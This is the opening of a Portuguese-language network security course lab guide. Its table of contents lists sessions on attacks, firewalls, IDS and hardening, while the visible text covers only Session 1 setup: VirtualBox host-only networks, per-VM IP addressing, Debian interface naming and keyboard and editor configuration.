</style>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
</head>
<body class="article">
<div id="header">
<div id="toc" class="toc">
<div id="toctitle">Table of Contents</div>
<ul class="sectlevel1">
<li><a href="#_sessão_1_fundamentos_de_segurança">Sessão 1: Fundamentos de segurança</a>
<ul class="sectlevel2">
<li><a href="#_1_da_divisão_de_grupos">1) Da divisão de grupos</a></li>
<li><a href="#_2_topologia_geral_de_rede">2) Topologia geral de rede</a></li>
<li><a href="#_3_configuração_do_virtualbox">3) Configuração do Virtualbox</a></li>
<li><a href="#_4_detalhamento_das_configurações_de_rede">4) Detalhamento das configurações de rede</a></li>
<li><a href="#_5_configuração_da_máquinas_virtuais">5) Configuração da máquinas virtuais</a></li>
<li><a href="#_6_configuração_de_firewall_e_nat">6) Configuração de firewall e NAT</a></li>
<li><a href="#_7_teste_de_conectividade_das_vms">7) Teste de conectividade das VMs</a></li>
<li><a href="#_8_instalação_do_virtualbox_guest_additions_nas_vms_windows">8) Instalação do <strong><em>Virtualbox Guest Additions</em></strong> nas VMs Windows</a></li>
<li><a href="#_9_instalação_do_virtualbox_guest_additions_nas_vms_linux">9) Instalação do <strong><em>Virtualbox Guest Additions</em></strong> nas VMs Linux</a></li>
<li><a href="#_10_configuração_da_vm_winserver_g">10) Configuração da VM <strong><em>WinServer-G</em></strong></a></li>
<li><a href="#_11_exercitando_os_fundamentos_de_segurança">11) Exercitando os fundamentos de segurança</a></li>
<li><a href="#_12_normas_e_políticas_de_segurança">12) Normas e políticas de segurança</a></li>
</ul>
</li>
<li><a href="#_sessão_2_explorando_vulnerabilidades_em_redes">Sessão 2: Explorando vulnerabilidades em redes</a>
<ul class="sectlevel2">
<li><a href="#_1_transferindo_arquivos_da_máquina_física_para_as_vms">1) Transferindo arquivos da máquina física para as VMs</a></li>
<li><a href="#_2_sniffers_para_captura_de_dados">2) <strong><em>Sniffers</em></strong> para captura de dados</a></li>
<li><a href="#_3_ataque_syn_flood">3) Ataque SYN <strong><em>flood</em></strong></a></li>
<li><a href="#_4_ataque_smurf">4) Ataque <strong><em>Smurf</em></strong></a></li>
<li><a href="#_5_levantamento_de_serviços_usando_o_nmap">5) Levantamento de serviços usando o <strong><em>nmap</em></strong></a></li>
<li><a href="#_6_realizando_um_ataque_com_o_metasploit">6) Realizando um ataque com o Metasploit</a></li>
<li><a href="#_7_realizando_um_ataque_de_dicionário_com_o_medusa">7) Realizando um ataque de dicionário com o <strong><em>medusa</em></strong></a></li>
</ul>
</li>
<li><a href="#_sessão_3_firewall">Sessão 3: Firewall</a>
<ul class="sectlevel2">
<li><a href="#_1_trabalhando_com_chains_no_iptables">1) Trabalhando com <strong><em>chains</em></strong> no <strong><em>iptables</em></strong></a></li>
<li><a href="#_2_firewall_stateful">2) Firewall <strong><em>stateful</em></strong></a></li>
<li><a href="#_3_configurando_o_firewall_fwgw1_g_tabela_filter">3) Configurando o firewall <strong><em>FWGW1-G</em></strong>: tabela <strong><em>filter</em></strong></a></li>
<li><a href="#_4_configurando_o_firewall_fwgw1_g_tabela_nat">4) Configurando o firewall <strong><em>FWGW1-G</em></strong>: tabela <strong><em>nat</em></strong></a></li>
<li><a href="#_6_revisão_final_da_configuração_do_firewall_fwgw1_g">6) Revisão final da configuração do firewall <strong><em>FWGW1-G</em></strong></a></li>
</ul>
</li>
<li><a href="#_sessão_4_serviços_básicos_de_segurança">Sessão 4: Serviços básicos de segurança</a>
<ul class="sectlevel2">
<li><a href="#_1_configuração_do_servidor_de_log_remoto">1) Configuração do servidor de log remoto</a></li>
<li><a href="#_2_configuração_do_servidor_de_hora">2) Configuração do servidor de hora</a></li>
<li><a href="#_3_monitoramento_de_serviços">3) Monitoramento de serviços</a></li>
</ul>
</li>
<li><a href="#_sessão_5_sistema_de_detecçãoprevenção_de_intrusos">Sessão 5: Sistema de detecção/prevenção de intrusos</a>
<ul class="sectlevel2">
<li><a href="#_1_instalação_do_snort">1) Instalação do Snort</a></li>
<li><a href="#_2_configuração_inicial_do_snort">2) Configuração inicial do Snort</a></li>
<li><a href="#_3_configurando_atualizações_de_regras_de_forma_automática_com_o_pulledpork">3) Configurando atualizações de regras de forma automática com o PulledPork</a></li>
<li><a href="#_4_processando_arquivos_de_log_do_snort_com_o_barnyard2">4) Processando arquivos de log do Snort com o Barnyard2</a></li>
<li><a href="#_5_visualizando_eventos_com_o_snorby">5) Visualizando eventos com o Snorby</a></li>
<li><a href="#_6_integração_dos_serviços_com_o_sistema">6) Integração dos serviços com o sistema</a></li>
<li><a href="#_7_gerando_alertas_para_o_ids">7) Gerando alertas para o IDS</a></li>
<li><a href="#_referências">Referências</a></li>
</ul>
</li>
<li><a href="#_sessão_6_autenticação_autorização_e_certificação_digital">Sessão 6: Autenticação, autorização e certificação digital</a>
<ul class="sectlevel2">
<li><a href="#_1_uso_de_criptografia_simétrica_em_arquivos">1) Uso de criptografia simétrica em arquivos</a></li>
<li><a href="#_2_uso_de_criptografia_assimétrica_em_arquivos">2) Uso de criptografia assimétrica em arquivos</a></li>
<li><a href="#_3_uso_de_criptografia_assimétrica_em_e_mails">3) Uso de criptografia assimétrica em e-mails</a></li>
<li><a href="#_4_criptografia_de_partições_e_volumes">4) Criptografia de partições e volumes</a></li>
<li><a href="#_5_autenticação_usando_sistema_otp">5) Autenticação usando sistema OTP</a></li>
</ul>
</li>
<li><a href="#_sessão_7_redes_privadas_virtuais_e_inspeção_de_tráfego">Sessão 7: Redes privadas virtuais e inspeção de tráfego</a>
<ul class="sectlevel2">
<li><a href="#_1_interceptação_ofensiva_de_tráfego_https_com_o_mitmproxy">1) Interceptação ofensiva de tráfego HTTPS com o <strong><em>mitmproxy</em></strong></a></li>
<li><a href="#_2_inspeção_corporativa_de_tráfego_https_usando_o_squid">2) Inspeção corporativa de tráfego HTTPS usando o Squid</a></li>
<li><a href="#_3_vpn_ssl_usando_o_openvpn">3) VPN SSL usando o OpenVPN</a></li>
</ul>
</li>
<li><a href="#_sessão_8_auditoria_de_segurança_da_informação">Sessão 8: Auditoria de segurança da informação</a>
<ul class="sectlevel2">
<li><a href="#_1_instalação_do_nessus">1) Instalação do Nessus</a></li>
<li><a href="#_2_realizando_um_scan_em_so_linux">2) Realizando um <strong><em>scan</em></strong> em SO Linux</a></li>
<li><a href="#_3_realizando_um_scan_em_so_windows">3) Realizando um <strong><em>scan</em></strong> em SO Windows</a></li>
<li><a href="#_4_efeitos_do_firewall_em_um_scan">4) Efeitos do firewall em um <strong><em>scan</em></strong></a></li>
<li><a href="#_5_auditoria_de_servidores_web">5) Auditoria de servidores web</a></li>
</ul>
</li>
<li><a href="#_sessão_9_configuração_segura_de_servidores_windows">Sessão 9: Configuração segura de servidores Windows</a>
<ul class="sectlevel2">
<li><a href="#_1_configuração_do_controlador_de_domínio_active_directory">1) Configuração do controlador de domínio <strong><em>Active Directory</em></strong></a></li>
<li><a href="#_2_configuração_do_firewall_para_o_active_directory">2) Configuração do firewall para o <strong><em>Active Directory</em></strong></a></li>
<li><a href="#_3_adição_de_clientes_ao_active_directory">3) Adição de clientes ao <strong><em>Active Directory</em></strong></a></li>
<li><a href="#_4_adição_de_usuários_ao_active_directory">4) Adição de usuários ao <strong><em>Active Directory</em></strong></a></li>
<li><a href="#_5_distribuição_de_configurações_via_gpos">5) Distribuição de configurações via GPOs</a></li>
<li><a href="#_6_instalação_e_configuração_do_wsus">6) Instalação e configuração do WSUS</a></li>
<li><a href="#_7_configuração_de_clientes_no_wsus">7) Configuração de clientes no WSUS</a></li>
</ul>
</li>
<li><a href="#_sessão_10_configuração_segura_de_servidores_linux">Sessão 10: Configuração segura de servidores Linux</a>
<ul class="sectlevel2">
<li><a href="#_1_análise_de_rootkits">1) Análise de <strong><em>rootkits</em></strong></a></li>
<li><a href="#_2_inserção_de_senha_no_bootloader">2) Inserção de senha no <strong><em>bootloader</em></strong></a></li>
<li><a href="#_3_remoção_de_serviços_desnecessários">3) Remoção de serviços desnecessários</a></li>
<li><a href="#_4_controle_granular_de_acesso_a_comandos">4) Controle granular de acesso a comandos</a></li>
<li><a href="#_5_controle_de_uso_do_binário_su">5) Controle de uso do binário <strong><em>su</em></strong></a></li>
<li><a href="#_6_controle_de_acesso_à_console_do_sistema">6) Controle de acesso à console do sistema</a></li>
<li><a href="#_7_exigência_de_parâmetros_mínimos_de_senha">7) Exigência de parâmetros mínimos de senha</a></li>
<li><a href="#_8_controle_de_logoff_automático">8) Controle de logoff automático</a></li>
<li><a href="#_9_desabilitando_a_combinação_de_teclas_ctrl_alt_del">9) Desabilitando a combinação de teclas CTRL + ALT + DEL</a></li>
</ul>
</li>
</ul>
</div>
</div>
<div id="content">
<link rel="stylesheet"  href="http://cdnjs.cloudflare.com/ajax/libs/font-awesome/3.1.0/css/font-awesome.min.css">
<div class="sect1">
<h2 id="_sessão_1_fundamentos_de_segurança">Sessão 1: Fundamentos de segurança</h2>
<div class="sectionbody">
<div class="sect2">
<h3 id="_1_da_divisão_de_grupos">1) Da divisão de grupos</h3>
<div class="paragraph">
<p>Neste curso, os alunos serão divididos em dois grupos: <code>A</code> e <code>B</code>. Ao longo da semana, iremos realizar algumas atividades que vão envolver a intercomunicação entre máquinas virtuais dos alunos de cada grupo; para que as configurações de rede de dois alunos envolvidos em uma mesma atividade não conflitem, iremos adotar uma nomenclatura de endereços para cada grupo, como se segue:</p>
</div>
<table class="tableblock frame-all grid-all" style="width: 50%;">
<caption class="title">Table 1. Nomenclatura entre grupos</caption>
<colgroup>
<col style="width: 50%;">
<col style="width: 50%;">
</colgroup>
<thead>
<tr>
<th class="tableblock halign-left valign-top">Grupo</th>
<th class="tableblock halign-left valign-top">Sufixo de endereço</th>
</tr>
</thead>
<tbody>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">A</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">1</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">B</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">2</p></td>
</tr>
</tbody>
</table>
<div class="paragraph">
<p>O que isso significa, na prática? Em vários momentos, ao ler este material, você irá se deparar com endereços como 172.16.G.20 ou 10.1.G.10&#8201;&#8212;&#8201;que evidentemente são inválidos. Nesse momento, substitua o número do seu grupo pela letra <code>G</code> no endereço. Se você for membro do grupo <code>B</code>, portanto, os endereços acima seriam 172.16.2.20 e 10.1.2.10.</p>
</div>
<div style="page-break-after: always;"></div>
</div>
<div class="sect2">
<h3 id="_2_topologia_geral_de_rede">2) Topologia geral de rede</h3>
<div class="paragraph">
<p>A figura abaixo mostra a topologia de rede que será utilizada durante este curso. Nos tópicos que se seguem, iremos verificar que a importação de máquinas virtuais, configurações de rede e conectividade estão funcionais antes de prosseguir. As configurações específicas de cada máquina/interface serão detalhadas na seção a seguir.</p>
</div>
<div id="img-topologia" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/Topologia_SEG12_Semana2.png" alt="Topologia SEG12 Semana2">
</div>
<div class="title">Figure 1. Topologia de rede do curso</div>
</div>
<div style="page-break-after: always;"></div>
</div>
<div class="sect2">
<h3 id="_3_configuração_do_virtualbox">3) Configuração do Virtualbox</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Primeiramente, verifique se todas as máquinas virtuais foram importadas.</p>
<div class="paragraph">
<p>Se ainda não foram, importe-as manualmente através do menu <em>File</em> &gt; <em>Import Appliance</em>. Navegue até a pasta onde se encontra o arquivo <code>.ova</code> com as imagens das máquinas virtuais e clique em <em>Next</em>. Na tela subsequente, marque a caixa <em>Reinitialize the MAC address of all network cards</em> e só depois clique em <em>Import</em>.</p>
</div>
<div class="paragraph">
<p>Ao final do processo, você deve ter cinco VMs com as configurações que se seguem. Renomeie as máquinas virtuais com os nomes indicados na tabela abaixo, substituindo o <code>G</code> pela letra do seu grupo. Para renomear máquinas virtuais no Virtualbox, acesse <em>Settings</em> &gt; <em>General</em> &gt; <em>Name</em> e altere o nome da VM (a mesma deve estar previamente desligada).</p>
</div>
<table class="tableblock frame-all grid-all" style="width: 50%;">
<caption class="title">Table 2. VMs disponíveis no Virtualbox</caption>
<colgroup>
<col style="width: 50%;">
<col style="width: 50%;">
</colgroup>
<thead>
<tr>
<th class="tableblock halign-left valign-top">Nome VM</th>
<th class="tableblock halign-left valign-top">Memória</th>
</tr>
</thead>
<tbody>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">FWGW1-G</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">2048 MB</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">LinServer-G</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">2048 MB</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">WinServer-G</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">2048 MB</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">KaliLinux-G</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">2048 MB</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">WinClient-G</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">2048 MB</p></td>
</tr>
</tbody>
</table>
<div class="paragraph">
<p>Se a quantidade de RAM de alguma das máquinas for inferior aos valores estipulados, ajuste-a.</p>
</div>
</li>
<li>
<p>Agora, configure as redes do Virtualbox. Acesso o menu <em>File</em> &gt; <em>Host Network Manager</em> e crie as seguintes redes:</p>
<table class="tableblock frame-all grid-all stretch">
<caption class="title">Table 3. Redes <em>host-only</em> no Virtualbox</caption>
<colgroup>
<col style="width: 25%;">
<col style="width: 25%;">
<col style="width: 25%;">
<col style="width: 25%;">
</colgroup>
<thead>
<tr>
<th class="tableblock halign-left valign-top">Rede</th>
<th class="tableblock halign-left valign-top">Endereço IPv4</th>
<th class="tableblock halign-left valign-top">Máscara de rede</th>
<th class="tableblock halign-left valign-top">Servidor DHCP</th>
</tr>
</thead>
<tbody>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">Virtualbox Host-Only Ethernet Adapter</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">172.16.G.254</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">255.255.255.0</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Desabilitado</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">Virtualbox Host-Only Ethernet Adapter #2</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">10.1.G.254</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">255.255.255.0</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Desabilitado</p></td>
</tr>
</tbody>
</table>
<div style="page-break-after: always;"></div>
</li>
<li>
<p>Finalmente, configure as interfaces de rede de cada máquinas virtual. Para cada VM, acesse <em>Settings</em> &gt; <em>Network</em> e faça as configurações que se seguem:</p>
<table class="tableblock frame-all grid-all stretch">
<caption class="title">Table 4. Interfaces de rede das máquinas virtuais</caption>
<colgroup>
<col style="width: 25%;">
<col style="width: 25%;">
<col style="width: 25%;">
<col style="width: 25%;">
</colgroup>
<thead>
<tr>
<th class="tableblock halign-left valign-middle">VM Nome</th>
<th class="tableblock halign-left valign-middle">Interface</th>
<th class="tableblock halign-left valign-middle">Conectado a</th>
<th class="tableblock halign-left valign-middle">Nome da rede</th>
</tr>
</thead>
<tbody>
<tr>
<td class="tableblock halign-left valign-middle" rowspan="3"><p class="tableblock">FWGW1-G</p></td>
<td class="tableblock halign-left valign-middle"><p class="tableblock">Adapter 1</p></td>
<td class="tableblock halign-left valign-middle"><p class="tableblock">Bridged Adapter</p></td>
<td class="tableblock halign-left valign-middle"><p class="tableblock">Placa de rede física do <em>host</em></p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-middle"><p class="tableblock">Adapter 2</p></td>
<td class="tableblock halign-left valign-middle"><p class="tableblock">Host-only Adapter</p></td>
<td class="tableblock halign-left valign-middle"><p class="tableblock">Virtualbox Host-Only Ethernet Adapter</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-middle"><p class="tableblock">Adapter 3</p></td>
<td class="tableblock halign-left valign-middle"><p class="tableblock">Host-only Adapter</p></td>
<td class="tableblock halign-left valign-middle"><p class="tableblock">Virtualbox Host-Only Ethernet Adapter #2</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-middle"><p class="tableblock">LinServer-G</p></td>
<td class="tableblock halign-left valign-middle"><p class="tableblock">Adapter 1</p></td>
<td class="tableblock halign-left valign-middle"><p class="tableblock">Host-only Adapter</p></td>
<td class="tableblock halign-left valign-middle"><p class="tableblock">Virtualbox Host-Only Ethernet Adapter</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-middle"><p class="tableblock">WinServer-G</p></td>
<td class="tableblock halign-left valign-middle"><p class="tableblock">Adapter 1</p></td>
<td class="tableblock halign-left valign-middle"><p class="tableblock">Host-only Adapter</p></td>
<td class="tableblock halign-left valign-middle"><p class="tableblock">Virtualbox Host-Only Ethernet Adapter</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-middle"><p class="tableblock">KaliLinux-G</p></td>
<td class="tableblock halign-left valign-middle"><p class="tableblock">Adapter 1</p></td>
<td class="tableblock halign-left valign-middle"><p class="tableblock">Host-only Adapter</p></td>
<td class="tableblock halign-left valign-middle"><p class="tableblock">Virtualbox Host-Only Ethernet Adapter</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-middle"><p class="tableblock">WinClient-G</p></td>
<td class="tableblock halign-left valign-middle"><p class="tableblock">Adapter 1</p></td>
<td class="tableblock halign-left valign-middle"><p class="tableblock">Host-only Adapter</p></td>
<td class="tableblock halign-left valign-middle"><p class="tableblock">Virtualbox Host-Only Ethernet Adapter #2</p></td>
</tr>
</tbody>
</table>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_4_detalhamento_das_configurações_de_rede">4) Detalhamento das configurações de rede</h3>
<div class="paragraph">
<p>As configurações de rede realizadas internamente em cada máquina virtual foram apresentados de forma sucinta na figura 1. Iremos detalhar as configurações logo abaixo:</p>
</div>
<table class="tableblock frame-all grid-all stretch">
<caption class="title">Table 5. Configurações de rede de cada VM</caption>
<colgroup>
<col style="width: 16.6666%;">
<col style="width: 16.6666%;">
<col style="width: 16.6666%;">
<col style="width: 16.6666%;">
<col style="width: 16.6666%;">
<col style="width: 16.667%;">
</colgroup>
<thead>
<tr>
<th class="tableblock halign-left valign-middle">VM Nome</th>
<th class="tableblock halign-left valign-middle">Interface</th>
<th class="tableblock halign-left valign-middle">Modo</th>
<th class="tableblock halign-left valign-middle">Endereço</th>
<th class="tableblock halign-left valign-middle">Gateway</th>
<th class="tableblock halign-left valign-middle">Servidores DNS</th>
</tr>
</thead>
<tbody>
<tr>
<td class="tableblock halign-left valign-middle" rowspan="3"><p class="tableblock">FWGW1-G</p></td>
<td class="tableblock halign-left valign-middle"><p class="tableblock">eth0</p></td>
<td class="tableblock halign-left valign-middle"><p class="tableblock">Estático</p></td>
<td class="tableblock halign-left valign-middle"><p class="tableblock">DHCP</p></td>
<td class="tableblock halign-left valign-middle"><p class="tableblock">Automático</p></td>
<td class="tableblock halign-left valign-middle"><p class="tableblock">Automático</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-middle"><p class="tableblock">eth1</p></td>
<td class="tableblock halign-left valign-middle"><p class="tableblock">Estático</p></td>
<td class="tableblock halign-left valign-middle"><p class="tableblock">172.16.G.1/24</p></td>
<td class="tableblock halign-left valign-middle"><p class="tableblock">n/a</p></td>
<td class="tableblock halign-left valign-middle"><p class="tableblock">n/a</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-middle"><p class="tableblock">eth2</p></td>
<td class="tableblock halign-left valign-middle"><p class="tableblock">Estático</p></td>
<td class="tableblock halign-left valign-middle"><p class="tableblock">10.1.G.1/24</p></td>
<td class="tableblock halign-left valign-middle"><p class="tableblock">n/a</p></td>
<td class="tableblock halign-left valign-middle"><p class="tableblock">n/a</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-middle"><p class="tableblock">LinServer-G</p></td>
<td class="tableblock halign-left valign-middle"><p class="tableblock">eth0</p></td>
<td class="tableblock halign-left valign-middle"><p class="tableblock">Estático</p></td>
<td class="tableblock halign-left valign-middle"><p class="tableblock">172.16.G.10/24</p></td>
<td class="tableblock halign-left valign-middle"><p class="tableblock">172.16.G.1</p></td>
<td class="tableblock halign-left valign-middle"><p class="tableblock">8.8.8.8 ; 8.8.4.4</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-middle"><p class="tableblock">WinServer-G</p></td>
<td class="tableblock halign-left valign-middle"><p class="tableblock">eth0</p></td>
<td class="tableblock halign-left valign-middle"><p class="tableblock">Estático</p></td>
<td class="tableblock halign-left valign-middle"><p class="tableblock">172.16.G.20/24</p></td>
<td class="tableblock halign-left valign-middle"><p class="tableblock">172.16.G.1</p></td>
<td class="tableblock halign-left valign-middle"><p class="tableblock">8.8.8.8 ; 8.8.4.4</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-middle"><p class="tableblock">KaliLinux-G</p></td>
<td class="tableblock halign-left valign-middle"><p class="tableblock">eth0</p></td>
<td class="tableblock halign-left valign-middle"><p class="tableblock">Estático</p></td>
<td class="tableblock halign-left valign-middle"><p class="tableblock">172.16.G.30/24</p></td>
<td class="tableblock halign-left valign-middle"><p class="tableblock">172.16.G.1</p></td>
<td class="tableblock halign-left valign-middle"><p class="tableblock">8.8.8.8 ; 8.8.4.4</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-middle"><p class="tableblock">WinClient-G</p></td>
<td class="tableblock halign-left valign-middle"><p class="tableblock">eth0</p></td>
<td class="tableblock halign-left valign-middle"><p class="tableblock">Estático</p></td>
<td class="tableblock halign-left valign-middle"><p class="tableblock">10.1.G.10/24</p></td>
<td class="tableblock halign-left valign-middle"><p class="tableblock">10.1.G.1</p></td>
<td class="tableblock halign-left valign-middle"><p class="tableblock">8.8.8.8 ; 8.8.4.4</p></td>
</tr>
</tbody>
</table>
<div class="paragraph">
<p>A partir do Debian 9, a nomenclatura padrão de interfaces de rede foi alterada. Ao invés de denotarmos as interfaces como <code>eth0</code>, <code>eth1</code> ou <code>eth2</code>, o <code>systemd/udev</code> utiliza, a partir da versão v197, um método de nomenclatura de interfaces usando <em>biosdevnames</em>, como documentado oficialmente em <a href="https://www.freedesktop.org/wiki/Software/systemd/PredictableNetworkInterfaceNames/" class="bare">https://www.freedesktop.org/wiki/Software/systemd/PredictableNetworkInterfaceNames/</a> . Com efeito, esse novo sistema suporta cinco meios de nomeação de interfaces de rede:</p>
</div>
<div class="openblock">
<div class="content">
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Nomes incorporando números de índice providos pelo firmware/BIOS de dispositivos <em>on-board</em> (p.ex.: <code>eno1</code>)</p>
</li>
<li>
<p>Nomes incorporando números de índice providos pelo firmware/BIOS de encaixes <em>hotplug</em> PCI Express (p.ex.: <code>ens1</code>)</p>
</li>
<li>
<p>Nomes incorporando localização física/geográfica do conector do hardware (p.ex.: <code>enp2s0</code>)</p>
</li>
<li>
<p>Nomes incorporando o endereço MAC da interface (p.ex.: <code>enx78e7d1ea46da</code>)</p>
</li>
<li>
<p>Nomes clássicos, usando nomenclatura não-previsível nativa do kernel (p.ex.: <code>eth0</code>)</p>
</li>
</ol>
</div>
</div>
</div>
<div class="paragraph">
<p>Como as máquinas <em>FWGW1-G</em> e <em>LinServer-G</em> são instalações do Debian 9, isso significa dizer que as entradas de interface na tabela anterior ficam da seguinte forma:</p>
</div>
<table class="tableblock frame-all grid-all" style="width: 70%;">
<caption class="title">Table 6. Nomenclatura de interfaces de máquinas Debian 9</caption>
<colgroup>
<col style="width: 33.3333%;">
<col style="width: 33.3333%;">
<col style="width: 33.3334%;">
</colgroup>
<thead>
<tr>
<th class="tableblock halign-left valign-middle">VM Nome</th>
<th class="tableblock halign-left valign-middle">Interface antiga</th>
<th class="tableblock halign-left valign-middle">Interface nova</th>
</tr>
</thead>
<tbody>
<tr>
<td class="tableblock halign-left valign-middle" rowspan="3"><p class="tableblock">FWGW1-G</p></td>
<td class="tableblock halign-left valign-middle"><p class="tableblock">eth0</p></td>
<td class="tableblock halign-left valign-middle"><p class="tableblock">enp0s3</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-middle"><p class="tableblock">eth1</p></td>
<td class="tableblock halign-left valign-middle"><p class="tableblock">enp0s8</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-middle"><p class="tableblock">eth2</p></td>
<td class="tableblock halign-left valign-middle"><p class="tableblock">enp0s9</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-middle"><p class="tableblock">LinServer-G</p></td>
<td class="tableblock halign-left valign-middle"><p class="tableblock">eth0</p></td>
<td class="tableblock halign-left valign-middle"><p class="tableblock">enp0s3</p></td>
</tr>
</tbody>
</table>
<div class="paragraph">
<p>Observe, por exemplo, como é feita a detecção de interfaces durante o <em>boot</em> da máquina <em>FWGW1-G</em>:</p>
</div>
<div class="literalblock">
<div class="content">
<pre># hostname
FWGW1-A

# dmesg | grep 'renamed from'
[    1.667147] e1000 0000:00:09.0 enp0s9: renamed from eth2
[    1.667995] e1000 0000:00:08.0 enp0s8: renamed from eth1
[    1.668885] e1000 0000:00:03.0 enp0s3: renamed from eth0</pre>
</div>
</div>
<div style="page-break-after: always;"></div>
</div>
<div class="sect2">
<h3 id="_5_configuração_da_máquinas_virtuais">5) Configuração da máquinas virtuais</h3>
<div class="paragraph">
<p>Agora, vamos configurar a rede de cada máquina virtual de acordo com as especificações da topologia de rede apresentada no começo deste capítulo.</p>
</div>
<div class="admonitionblock warning">
<table>
<tr>
<td class="icon">
<i class="fa icon-warning" title="Warning"></i>
</td>
<td class="content">
<div class="paragraph">
<p>Observe que as máquinas virtuais da <strong>DMZ</strong> e <strong>Intranet</strong> poderão ainda não ter acesso à Internet neste passo, pois ainda não configuramos o firewall. A próxima seção irá tratar deste tópico.</p>
</div>
</td>
</tr>
</table>
</div>
<div class="admonitionblock warning">
<table>
<tr>
<td class="icon">
<i class="fa icon-warning" title="Warning"></i>
</td>
<td class="content">
<div class="paragraph">
<p>Para tangibilizar os exemplos nas configurações-modelo deste gabarito, iremos assumir que o aluno é membro do grupo <code>A</code>, ou seja, tem suas máquinas virtuais nas redes 172.16.1.0/24 e 10.1.1.0/24. Se você for membro do grupo <code>B</code>, tenha o cuidado de sempre adaptar os endereços IP dos exemplos para as suas faixas de rede.</p>
</div>
</td>
</tr>
</table>
</div>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Primeiramente, ligue a máquina <em>FWGW1-G</em> e faça login como usuário <code>root</code> e senha <code>rnpesr</code>. Verifique se o mapa de teclado está correto (teste com os caracteres <code>/</code> ou <code>ç</code>). Se não estiver, execute o comando:</p>
<div class="literalblock">
<div class="content">
<pre># dpkg-reconfigure keyboard-configuration</pre>
</div>
</div>
<div class="paragraph">
<p>Nas perguntas que se seguem, responda:</p>
</div>
<table class="tableblock frame-all grid-all stretch">
<caption class="title">Table 7. Configurações de teclado</caption>
<colgroup>
<col style="width: 50%;">
<col style="width: 50%;">
</colgroup>
<thead>
<tr>
<th class="tableblock halign-left valign-top">Pergunta</th>
<th class="tableblock halign-left valign-top">Parâmetro</th>
</tr>
</thead>
<tbody>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">Modelo do teclado</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">PC (Intl) Genérico de 105 teclas</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">Layout do teclado</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Outro &gt; Português (Brasil) &gt; Português (Brasil)</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">Tecla para funcionar como AltGr</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Alt Direito (AltGr)</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">Tecla Compose</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Tecla Logo Direita</p></td>
</tr>
</tbody>
</table>
<div class="paragraph">
<p>Finalmente, execute o comando que se segue. Volte a testar o teclado e verifique seu funcionamento.</p>
</div>
<div class="literalblock">
<div class="content">
<pre># systemctl restart keyboard-setup.service</pre>
</div>
</div>
<div class="paragraph">
<p>Se ainda não estiver funcional, reinicie a VM e teste novamente.</p>
</div>
</li>
<li>
<p>Ao longo do curso, iremos editar vários arquivos de texto em ambiente Linux. Há vários editores de texto disponíveis para a tarefa, como o <code>vi</code>, <code>emacs</code> ou <code>nano</code>. Caso você não esteja familiarizado com um editor de texto, recomendamos o uso do <code>nano</code>, que possui uma interface bastante amigável para usuários iniciantes. Para editar um arquivo com o <code>nano</code>, basta digitar <code>nano</code> seguido do nome do arquivo a editar&#8201;&#8212;&#8201;não é necessário que o arquivo tenha sido criado previamente:</p>
<div class="literalblock">
<div class="content">
<pre># nano teste</pre>
</div>
</div>
<div class="paragraph">
<p>Digite livremente a seguir. Use as setas do teclado para navegar no texto, e <code>DELETE</code> ou <code>BACKSPACE</code> para apagar texto. O <code>nano</code> possui alguns atalhos interessantes, como:</p>
</div>
<div class="openblock">
<div class="content">
<div class="ulist">
<ul>
<li>
<p><code>CTRL + G</code>: Exibir a ajuda do editor</p>
</li>
<li>
